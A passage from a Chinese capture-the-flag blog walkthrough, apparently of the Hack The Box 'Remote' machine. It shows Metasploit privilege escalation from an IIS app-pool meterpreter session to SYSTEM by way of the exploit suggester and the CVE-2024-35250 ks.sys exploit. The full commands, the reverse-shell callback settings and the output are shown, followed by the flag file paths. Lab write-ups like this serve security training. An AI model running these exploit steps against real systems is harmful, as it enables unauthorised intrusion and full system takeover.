+  <span class="token number">1</span>         meterpreter x64/windows  IIS APPPOOL<span class="token punctuation">\</span>DefaultAppPool @  <span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.
+                                      REMOTE                       <span class="token number">180</span>:49698 <span class="token punctuation">(</span><span class="token number">10.10</span>.10.180<span class="token punctuation">)</span>
+
+msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions <span class="token parameter variable">-i</span> <span class="token number">1</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with <span class="token number">1</span><span class="token punctuation">..</span>.
+
+meterpreter <span class="token operator">></span> sysinfo 
+Computer        <span class="token builtin class-name">:</span> REMOTE
+OS              <span class="token builtin class-name">:</span> Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span><span class="token number">10.0</span> Build <span class="token number">17763</span><span class="token punctuation">)</span>.
+Architecture    <span class="token builtin class-name">:</span> x64
+System Language <span class="token builtin class-name">:</span> en_US
+Domain          <span class="token builtin class-name">:</span> WORKGROUP
+Logged On Users <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Meterpreter     <span class="token builtin class-name">:</span> x64/windows</code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>post/multi/recon/local_exploit_suggester</code>  收集信息，查找可以提权的脚本</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> use post/multi/recon/local_exploit_suggester 
+msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
+session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
+msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x64/windows<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - <span class="token number">203</span> exploit checks are being tried<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows <span class="token number">10</span> v1809 build was detected<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server <span class="token number">2019</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The <span class="token function">service</span> is running, but could not be validated.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running check method <span class="token keyword">for</span> exploit <span class="token number">48</span> / <span class="token number">48</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Valid modules <span class="token keyword">for</span> session <span class="token number">1</span>:
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></code></pre>
+
+<p>根据查找结果使用 <code>windows/local/cve_2024_35250_ks_driver</code> 进行提权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
+LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
+msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">3</span>
+session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3</span>
+msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">7777</span>
+LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">7777</span>
+msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:7777 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching notepad to <span class="token function">host</span> the exploit<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad path is: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>notepad.exe
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad pid is: <span class="token number">4628</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the DLL into <span class="token number">4628</span><span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">4</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:7777 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49703<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:26:34 +0800
+
+meterpreter <span class="token operator">></span> getuid 
+Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM
+meterpreter <span class="token operator">></span> 
+</code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Users\Public\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CVE/" rel="tag"># CVE</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"># 信息收集</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/e5f5ab78.html" rel="prev" title="HTB-Love">
+                  <i class="fa fa-angle-left"></i> HTB-Love
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/1cdd7a67.html" rel="next" title="HTB-Blocky">
+                  HTB-Blocky <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ry0ma24</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
